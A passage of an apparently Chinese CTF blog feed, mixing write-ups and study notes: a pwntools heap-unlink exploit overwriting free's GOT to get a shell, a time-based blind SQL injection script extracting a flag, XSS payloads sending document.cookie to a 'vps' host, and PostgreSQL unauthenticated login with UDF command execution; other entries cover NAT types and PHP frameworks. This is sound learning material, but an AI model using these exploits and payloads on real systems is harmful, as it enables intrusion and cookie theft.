<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

local <span class="token operator">=</span> <span class="token number">1</span>

<span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.107.32.132'</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./silent2'</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./silent2"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> con<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> con<span class="token punctuation">,</span> con_<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con_<span class="token punctuation">)</span>


system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
free_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>

add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#3</span>
add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#4</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#4</span>

<span class="token comment" spellcheck="true">############################## 这一部分对应着上面说的放缩的过程</span>
ptr <span class="token operator">=</span> <span class="token number">0x6020d8</span>
fake_fd <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x18</span>
fake_bk <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x10</span>
free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
payload  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake_prev + fake_size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_fd<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_bk<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake_fd + fake_bk</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake_chunk4_prev + fake_chun4_size</span>
add<span class="token punctuation">(</span><span class="token number">0xa0</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">############################## 至此, unlink结束...</span>
<span class="token comment" spellcheck="true"># 此时 ptr = fake_fd = 0x6020d8 - 0x18 = 0x6020c0 = chunk[0]</span>
<span class="token comment" spellcheck="true"># 就可以下次通过edit(3), 来更改chunk[0]的指向</span>

<span class="token comment" spellcheck="true"># 这一步使得chunk[0]指向free.got</span>
edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 使得free.got的内容为system.plt</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因为unlink的时候是要<code>p -&gt; fd -&gt; bk = p -&gt; bk -&gt; fd</code>, 也就是要<code>(p -&gt; fd) + 0x18 = (p -&gt; bk + 0x10) = ptr</code>, 这个ptr里存着的是指向p的指针, 我们的<code>0x6020c0</code>, 是一个存着每个指针的数组, 我们的chunk_3是存在<code>(0x6020c0)[3] = (0x6020c0 + 3 * 0x8) = 0x6020d8</code>的位置…, 所以这里是<code>fake_fd = 0x6020d8 - 0x18</code>, <code>fake_bk = 0x6020d8 - 0x10</code></p>
<p>因为fake的ptr需要, 所以要有chunk[0..2], 实际上1, 2没用上, 就是占位, 使得3因为4而被unlink的时候, 可以更改到chunk[0]的内容</p>
<h2 id="raisepig"><a href="#raisepig" class="headerlink" title="raisepig"></a>raisepig</h2><p>遇到的第一个问题就是, 函数<code>sub_1160</code>没法f5, 倒是一行一行看汇编也能看懂…但感觉很不爽…<br>会报错<code>positive sp value has been found</code></p>
<p>很久之前看到过解决办法, 实践一下<br>先勾一下这个, 显示栈指针</p>
<pre><code>Options -&gt; Disassembly -&gt; Stack pointer
</code></pre><p>然后在retn处的偏移不是0, 我在这题里看到的是<code>-04</code></p>
<pre><code>.text:00000000000011F2 014                 leave
.text:00000000000011F3 -04                 retn
.text:00000000000011F3     sub_1160        endp ; sp-analysis failed
</code></pre><p>在leave这里, <code>alt+k</code>, 在弹出来的菜单里把偏移量改成这里的<code>0x14</code>, (我这里原来是0x18)… 然后, 就会变成下图<br><code>retn</code>前的数字变成了<code>000</code>, 这个时候再<code>F5</code>就OK</p>
<pre><code>.text:00000000000011F2 014                 leave
.text:00000000000011F3 000                 retn
.text:00000000000011F3     sub_1160        endp ; sp-analysis failed
</code></pre><p>QAQ, 我也不知道为啥可以, 就是这样操作了一下…<br>然后看了一下…这函数好像啥都没干, 怎么<code>open</code>了<code>/dev/urandom</code>, 都没read, 就close了….一脸茫然</p>
<p>对, 还有函数跳转表这里, 要把十六进制先变成十进制, 才能转换成负数</p>
<p>接下来分析题目</p>
<p>哎, 我擦, 算了, 先睡觉</p>
<h2 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h2><p>todo </p>
<h2 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h2><p>todo </p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwnhub | 目瞪狗呆]]></title>
      <url>/2018/04/03/pwnhub-%E7%9B%AE%E7%9E%AA%E7%8B%97%E5%91%86/</url>
      <content type="html"><![CDATA[<p>没有回显..好像只能利用时间盲注</p>
<p>hgame里有一道过滤了if的题目好像就是这样子做的…但当时没过滤<code>sleep</code>之类的函数</p>
<pre class="line-numbers language-mysql"><code class="language-mysql">select 1 from user where id = 1 and 1=1 and sleep(5);
会延时
select 1 from user where id = 1 and 1=0 and sleep(5);
不会延时
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里过滤掉了常用时间盲注函数, 所以可以找到一个耗时的操作来代替原来sleep的位置, 但老有问题…有些位跑出来是错误的…<br>在延时上的设置…真是QAQ, 令人窒息的操作, 不知道是不是别人也在跑的原因..貌似我只能获得一部分正确的flag, 比如跑出来<code>p0n0u0{</code>, <code>pwnh0b{</code>…</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> string


<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#        print "False"</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
<span class="token comment" spellcheck="true">#        print "True"</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

url <span class="token operator">=</span> <span class="token string">"http://52.80.179.198:8080/article.php?id=1' and {} and 100 > (select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C)-- "</span>

payload <span class="token operator">=</span> <span class="token string">'(1=1)'</span>
payload <span class="token operator">=</span> <span class="token string">'(ord(substr(({}), {}, 1))={})'</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'select flag from flags'</span><span class="token punctuation">,</span> <span class="token string">'{}'</span><span class="token punctuation">,</span> <span class="token string">'{}'</span><span class="token punctuation">)</span>

att_url <span class="token operator">=</span> url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span> att_url

flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
        pay <span class="token operator">=</span> att_url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span> ord<span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> attack<span class="token punctuation">(</span>pay<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> ch
            <span class="token keyword">print</span> flag
            <span class="token keyword">print</span> pay
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
            <tag> pwnhub </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[学习 | js跨域]]></title>
      <url>/2018/03/28/%E5%AD%A6%E4%B9%A0-js%E8%B7%A8%E5%9F%9F/</url>
      <content type="html"><![CDATA[<p>这个题目很虚…我其实不是很懂…<br>我先记录一下不懂得东西, 以后也许会懂<br>只是看到题目中常用的payload</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>window.open('http://vps/xx.php?cookie=' + document.cookie); <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>window.location.href = 'http://vps/xx.php?cookie=' + document.cookie; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>还有建一个iframe的, 建一个a标签, click一下的, 还有import的, 还有ajax来open一下的</p>
<p>在什么情况下ajax可以用file协议读本地文件</p>
<p>emmmmmm, 还有一些知识, 比如</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>import<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>data:text/html;base64, xxxyyy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xss </tag>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[涨姿势 | sh 和 bash]]></title>
      <url>/2018/03/27/%E6%B6%A8%E5%A7%BF%E5%8A%BF-sh-%E5%92%8C-bash/</url>
      <content type="html"><![CDATA[<p>有一次在pwn的时候, 发现了一个<code>***sh</code>, 把这个<code>sh</code>发给<code>system()</code>也能起来shell…还一直傻傻的找<code>/bin/sh</code>…<br>直接在<code>bash</code>里输入<code>sh</code>…会发现…怎么不太一样</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> bash </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web | php框架]]></title>
      <url>/2018/03/26/web-php%E6%A1%86%E6%9E%B6/</url>
      <content type="html"><![CDATA[<p>没有使用php进行过开发…更没用过框架<br>而CTF里出现最多的就是php…感觉我可能需要学一下<br>刚刚我才知道原来大家一直说的<code>CI</code>原来是一种PHP框架, 我一直以为是一个类似<code>MVC</code>..的一个名词<br>我是多无知…</p>
<h3 id="CI"><a href="#CI" class="headerlink" title="CI"></a>CI</h3><p>叫CodeIgniter<br><a href="http://www.yulegeyu.com/2017/03/30/2017-0CTF-simplesqlin/" target="_blank" rel="external">http://www.yulegeyu.com/2017/03/30/2017-0CTF-simplesqlin/</a></p>
<h3 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h3><h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><h3 id="Yii"><a href="#Yii" class="headerlink" title="Yii"></a>Yii</h3><p>啧…等我过几天有时间…了解一下</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web | postgresql 相关学习]]></title>
      <url>/2018/03/26/web-postgresql-%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>这次qwb就做了两三道题…差不多零输出…</p>
<p>有一道题目叫彩蛋…据说做出来的很多人都是非预期解出来..就是大概是这样子</p>
<ol>
<li><p>先nmap扫一下发现5432端口的<code>psql</code>…</p>
</li>
<li><p>然后尝试未授权登录</p>
<pre><code>psql -h 106.75.97.46 -U postgres
</code></pre></li>
<li><p>之后使用UDF…<br>这里我不太会了…但目录下有一个现成的<code>udf.so</code>…可以用它create一个eval函数…</p>
<pre><code>postgres=# CREATE OR REPLACE FUNCTION my_eval()  RETURNS text AS  &#39;./udf.so&#39; LANGUAGE C STRICT;
</code></pre><p>然后, 执行命令就有flag了</p>
<pre><code>select my_eval(&#39;ls /&#39;)
select my_eval(&#39;cat /flag_is_here&#39;)
</code></pre><p>等有时间学一下这个udf….<br>只有一篇rr大佬发过的文章 <code>https://www.secpulse.com/archives/33105.html</code><br>应该是wooyun也发过<br>还有一篇 <code>http://www.jianfensec.com/postgresql_getshell.html</code></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[复习 | 计算机网络]]></title>
      <url>/2018/03/09/%E5%A4%8D%E4%B9%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      <content type="html"><![CDATA[<h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>NAT大概是工作在网络层, 维基百科上对它的描述:</p>
<blockquote>
<p>是一种在IP数据包通过路由器或防火墙时重写来源IP地址或目的IP地址的技术。这种技术被普遍使用在有多台主机但只通过一个公有IP地址访问因特网的私有网络中</p>
</blockquote>
<p>…根据规范，路由器是不能这样工作的…这是个什么意思…</p>
<p>我们连上路由器…然后只登陆一个人的账号, 其他连接的设备就都能上网了, 这个就是家用路由器产生的NAT在起作用</p>
<p>原来内网穿透说的就是NAT穿透</p>
<p>需要在专用网连接到因特网的路由器上安装NAT软件<br>也就是边界路由器有NAT吧<br><del>…防火墙和路由器的区别…到底在哪,,,是不是说路由器可以做防火墙</del><br>NAT 功能通常被集成到路由器、防火墙、ISDN路由器或者单独的NAT设备中</p>
<p>RFC 1632 里有NAT相关说明<br>NAT还有使得内网主机更加安全的作用</p>
<h3 id="CIDR"><a href="#CIDR" class="headerlink" title="CIDR"></a>CIDR</h3><p>NAT是为了解决IPv4地址耗尽的方法, 在NAT之前提出了一个CIDR(无类域间路由)<br>看起来这玩意是为了汇集网络地址</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>在一本 <em>数据通信与网络</em> 里看到说实现大概是, 需要一张转换表</p>
<h4 id="Basic-NAT"><a href="#Basic-NAT" class="headerlink" title="Basic NAT"></a>Basic NAT</h4><h5 id="使用一个ip地址"><a href="#使用一个ip地址" class="headerlink" title="使用一个ip地址"></a>使用一个ip地址</h5><p>这个时候表里只有两列, 就是内网ip和公网ip<br>在内网主机给外网主机发送一个请求的时候, 表就记下来这样一堆对应关系, 当外网主机在回复内网主机的时候, 就在表里找到外网主机ip对应的内网主机ip, 就OK<br> 但这样子的话缺点也很明显, 就在于, 不能有多台内部主机同时访问同一外网ip, 不然这样子的话, 在回复的时候就找不到这个外网ip对应的内网主机是啥了(一对多, 就GGG了)</p>
<h5 id="应用ip地址池"><a href="#应用ip地址池" class="headerlink" title="应用ip地址池"></a>应用ip地址池</h5><p>这个时候我们有数个公网ip可用, 比如有四个可用的话, 我们就可以同时有4太内网主机访问同一网页…但实质上不是一个解决问题的好方法</p>
<h4 id="NAPT-Network-Address-Port-Translation"><a href="#NAPT-Network-Address-Port-Translation" class="headerlink" title="NAPT(Network Address Port Translation)"></a>NAPT(Network Address Port Translation)</h4><p>这个好像是更常用的…<br>雾, 如果前面那种不包含端口的话, 那相当于内网地址(iAddr:port1)只能对于(eAddr:port1), 而不能映射到其他端口<br>同时使用ip和端口号<br>这样子的表格大概有这么5列</p>
<pre><code>+++++++++++++++++++++++++++++++++++++++++++++
专用地址|专用端口|外部地址|外部端口|传输协议|
+++++++++++++++++++++++++++++++++++++++++++++
</code></pre><p>维基百科上是写</p>
<pre><code>内网ip: 内网端口 -&gt; 外网ip: 外网端口
</code></pre><h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>那端口映射这功能是不是相当于, 定死了NAT的表项, 相当于静态NAT ???</p>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>来自维基百科</p>
<blockquote>
<p>一些需要初始化从外部网络创建的TCP连接和无状态协议, 比如UDP, 无法实现</p>
</blockquote>
<h3 id="NAT带来的影响"><a href="#NAT带来的影响" class="headerlink" title="NAT带来的影响"></a>NAT带来的影响</h3><p>我大概就是要研究和解决这些影响?</p>
<p>因为NAT后的主机发送请求之后, NAT设备才能记录下信息</p>
<h3 id="类型-RFC-3489"><a href="#类型-RFC-3489" class="headerlink" title="类型 RFC 3489"></a>类型 RFC 3489</h3><p>在网上看到说, 一般来说, 目前NAT中针对TCP的实现基本上是一致的, 其间并不存在太大差异, 这是因为TCP协议本身便是面向连接的, 因此无需考虑网络连接无状态所带来复杂性, 所以这个分类基本上可以认为是针对UDP<br>Notice: 这其中出现了三个地址:</p>
<ul>
<li>内网ip (iAddr:port1)</li>
<li>外网ip (eAddr:port2)</li>
<li>目标ip (dAddr:port3)</li>
</ul>
<p>安全性:   对称型 &gt; 端口受限圆锥 &gt; 受限圆锥     &gt;  完全圆锥<br>穿透性: 完全圆锥 &gt; 受限圆锥     &gt; 端口受限圆锥 &gt;  对称型</p>
<h4 id="锥形-非对称"><a href="#锥形-非对称" class="headerlink" title="锥形 非对称"></a>锥形 非对称</h4><p>应该是有三种, 下面的三个不同的圆锥形都算是非对称的<br>锥形是说, (iAddr:port1)出去的都会映射到(eAddr:port2), 就是这个映射是不变的…而不同锥形对于外部主机能够联系到内部主机的安全策略不通(应该是这样子说??), 满足某个条件, 外部主机才能联系到内部主机, 就是这个条件的强弱不同</p>
<h5 id="完全圆锥形-Full-cone-NAT"><a href="#完全圆锥形-Full-cone-NAT" class="headerlink" title="完全圆锥形 Full cone NAT"></a>完全圆锥形 Full cone NAT</h5><p>一对一…相当于我们常说的端口映射, 感觉像是完全静态的<br>正是因为是静态的, 固定的, 所以外部的服务器也可以主动发起请求到内部主机</p>
<h5 id="受限圆锥形-Address-Restricted-cone-NAT"><a href="#受限圆锥形-Address-Restricted-cone-NAT" class="headerlink" title="受限圆锥形 Address-Restricted cone NAT"></a>受限圆锥形 Address-Restricted cone NAT</h5><p>内部主机(iAddr:port1)要先给目的主机(A.B.C.D)发送过数据包, 然后外部主机(A.B.C.D:any_port)就可以通过内部主机映射的(eAddr:port2)发回给内部主机</p>
<h5 id="端口受限圆锥形-Port-Restricted-cone-NAT"><a href="#端口受限圆锥形-Port-Restricted-cone-NAT" class="headerlink" title="端口受限圆锥形 Port-Restricted cone NAT"></a>端口受限圆锥形 Port-Restricted cone NAT</h5><p>在受限圆锥形上加上了端口限制, 就是<br>内部主机(iAddr:port1)要先给目的主机的特定端口(A.B.C.D:port3)发送过数据包, 然后外部主机使用特定端口port3(其他端口不可以)才能通过内部主机映射的(eAddr:port2)发回给内部主机</p>
<h4 id="对称形-Symmetric-NAT"><a href="#对称形-Symmetric-NAT" class="headerlink" title="对称形 Symmetric NAT"></a>对称形 Symmetric NAT</h4><p>yep, 我要做的就是这个<br>同一内部IP与端口发到不同的目的地和端口的信息包，都使用不同的映射<br>那看起来就比非对称形简单?….卧槽,,,那为什么这种叫对称形呢</p>
<blockquote>
<p>只有曾经收到过内部主机数据的外部主机，才能够把数据包发回</p>
</blockquote>
<h5 id="还是没懂这个和端口受限形的NAT的区别在哪…"><a href="#还是没懂这个和端口受限形的NAT的区别在哪…" class="headerlink" title="还是没懂这个和端口受限形的NAT的区别在哪…?"></a>还是没懂这个和端口受限形的NAT的区别在哪…?</h5><p>好像是这样的, 锥形还是相当于静态的…就是目的主机是A时候, 这次iAddr:port1对应了eAddr:port2…, 当给一台新的主机发送消息时候还会复用port2这个端口<br>而对称型的, 同一内网主机同一端口号，每一次与不同的外网主机通讯，就重新分配另一个端口号, iAddr:port1给目标A发送信息, 会使用eAddr:port2, 而给目标B发送信息, 会使用eAddr:port3<br>这篇文章 <a href="http://blog.csdn.net/mycloudpeak/article/details/53550405" target="_blank" rel="external">http://blog.csdn.net/mycloudpeak/article/details/53550405</a></p>
<h3 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h3><p>翻译一下这个? <a href="https://computer.howstuffworks.com/nat.htm/printable" target="_blank" rel="external">https://computer.howstuffworks.com/nat.htm/printable</a><br>还有这个 <a href="http://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf" target="_blank" rel="external">http://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf</a><br>upnp</p>
<h3 id="doing"><a href="#doing" class="headerlink" title="doing"></a>doing</h3><p>那这个NAT穿越的组合共有10种, 因为双方的情况其实是C(5, 2)….我是研究, <code>对称-非对称</code>和<code>对称-对称</code>还是只研究<code>对称-对称</code>呢…</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>同时开启tcp_timestamps和tcp_tw_recycle选项时，会导致客户反馈连接成功率降低 <a href="http://perthcharles.github.io/2015/08/27/timestamp-NAT/" target="_blank" rel="external">http://perthcharles.github.io/2015/08/27/timestamp-NAT/</a></p>
<h3 id="弱智的思考"><a href="#弱智的思考" class="headerlink" title="弱智的思考"></a>弱智的思考</h3><p>所以, 无论是哪种NAT, 只要Client的二元组(iAddr:port1)变化了, 包括iAddr, port1, 任何一个变换了, 都会重新NAT一个端口,<br>对于Server</p>
<ul>
<li>如果Server的ip变了…会影响对称NAT后面client的映射端口, 不会影响非对称的NAT后的Clinet</li>
<li>如果Server的port变了, 好像不会对映射的端口发生影响<br>上面说的, 不影响是指不会改变端口, 但能不能打通还另有条件</li>
<li>完全圆锥: 可以直接通</li>
<li>受限圆锥: Client(iAddr:port1)要给Server(sAddr)发送过消息</li>
<li>端口受限圆锥: Client(iAddr:port1)要给Server(sAddr:port3)发送过消息</li>
<li>对称型: ???和上面的条件一样???</li>
</ul>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[issue | SwitchyOmega的auto witch]]></title>
      <url>/2018/03/08/issue-SwitchyOmega%E7%9A%84auto-witch/</url>
      <content type="html"><![CDATA[<p>自己的ss挂了..借了别人的ss, 然后发现…怎么没办法用, 访问google一直转圈圈</p>
<p>然后curl了一下发现是会跳到<code>www.google.com.hk</code>…然而auto switch里没有这条规则….工具栏上的<code>SwitchyOmega</code>里显示的也是<code>www.google.com</code>, 这样子就没法直接添加这条规则,,,得自己点进去设置, 手动添加这规则…</p>
<pre><code>*.google.com.*
</code></pre>]]></content>
      
        <categories>
            
            <category> issue </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn | trick]]></title>
